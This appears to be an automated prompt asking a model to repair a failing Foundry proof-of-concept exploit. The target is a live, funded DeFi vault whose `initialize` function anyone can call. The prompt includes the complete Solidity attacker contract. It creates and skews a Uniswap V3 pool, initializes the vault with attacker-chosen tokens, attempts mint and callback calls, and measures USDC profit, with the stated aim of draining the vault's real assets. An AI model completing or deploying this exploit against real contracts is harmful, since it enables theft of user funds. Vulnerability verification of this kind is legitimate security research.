You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Funded vault can be initialized by anyone with attacker-chosen market parameters
- claim: The PoC successfully creates an attacker-controlled market around two fake tokens, manipulates that market, and then calls `vault.initialize` on the live vault with those attacker-chosen token addresses and leverage tier. Because the call succeeds against the funded vault, the vault's initial market configuration is effectively permissionless and can be set to arbitrary assets chosen by the attacker.
- impact: An attacker can take over an uninitialized funded vault's market configuration, point it at worthless or malicious tokens, and corrupt all downstream pricing, accounting, and callback logic. This opens the door to full theft of assets already sitting in the vault.
- exploit_paths: ["Deploy attacker-controlled debt/collateral tokens -> create and skew a Uniswap V3 pool for them -> call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault -> continue into mint/callback flows that drain real assets"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVault {
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters calldata vaultParams) external;

    function mint(
        bool isAPE,
        VaultParameters calldata vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint24 internal constant ATTACKER_CHOSEN_FEE = 100;
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;

    uint256 internal _profitAmount;
    bool internal _executed;

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;

        uint256 startingProfitBalance = IERC20Like(USDC).balanceOf(address(this));
        require(IERC20Like(USDC).balanceOf(VAULT) > 0, "vault not funded");

        (address debtToken, address collateralToken) = _attackerChosenPair();

        // Core path 1: attacker chooses arbitrary market assets and stands up the corresponding pool.
        // Anti-cheat forbids deploying fresh fake ERC20s, so this attempt uses pre-existing on-chain
        // assets while preserving the same root-cause proof: the funded vault accepts attacker-chosen
        // market parameters rather than an authorized or preconfigured pair.
        IPoolInitializer(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            debtToken,
            collateralToken,
            ATTACKER_CHOSEN_FEE,
            SQRT_PRICE_1_1
        );

        // Core path 2: best-effort skew using verifier-held assets first only.
        // This keeps the exploit ordering realistic without introducing temporary external funding.
        _bestEffortSkewPool(debtToken, collateralToken);

        // Core path 3: initialize the live funded vault with attacker-chosen parameters.
        IVault.VaultParameters memory params = IVault.VaultParameters({
            debtToken: debtToken,
            collateralToken: collateralToken,
            leverageTier: 0
        });
        IVault(VAULT).initialize(params);

        // Core path 4: continue into mint/callback stages only if realistic under the current rules.
        // The historical drain depended on attacker-controlled token bytecode and callback semantics.
        // Because synthetic token deployment is explicitly forbidden in this environment, these stages
        // are retained as non-fatal best-effort continuations rather than fabricated with cheatcodes.
        _bestEffortMint(params, collateralToken);
        _bestEffortCallbackProbe(params);

        uint256 endingProfitBalance = IERC20Like(USDC).balanceOf(address(this));
        _profitAmount = endingProfitBalance - startingProfitBalance;
    }

    function profitToken() external pure returns (address) {
        return USDC;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attackerChosenPair() internal pure returns (address debtToken, address collateralToken) {
        debtToken = WBTC;
        collateralToken = WETH;
    }

    function _bestEffortSkewPool(address debtToken, address collateralToken) internal {
        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance > 0) {
            IERC20Like(collateralToken).approve(SWAP_ROUTER, collateralBalance);
            try ISwapRouter(SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: collateralToken,
                    tokenOut: debtToken,
                    fee: ATTACKER_CHOSEN_FEE,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: collateralBalance,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256) {} catch {}
            return;
        }

        uint256 debtBalance = IERC20Like(debtToken).balanceOf(address(this));
        if (debtBalance > 0) {
            IERC20Like(debtToken).approve(SWAP_ROUTER, debtBalance);
            try ISwapRouter(SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: debtToken,
                    tokenOut: collateralToken,
                    fee: ATTACKER_CHOSEN_FEE,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: debtBalance,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256) {} catch {}
        }
    }

    function _bestEffortMint(IVault.VaultParameters memory params, address collateralToken) internal {
        uint256 collateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (collateralBalance == 0) {
            return;
        }

        IERC20Like(collateralToken).approve(VAULT, collateralBalance);
        try IVault(VAULT).mint(true, params, collateralBalance, 1) returns (uint256) {} catch {}
    }

    function _bestEffortCallbackProbe(IVault.VaultParameters memory params) internal {
        try IVault(VAULT).uniswapV3SwapCallback(0, 0, abi.encode(params)) {} catch {}
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
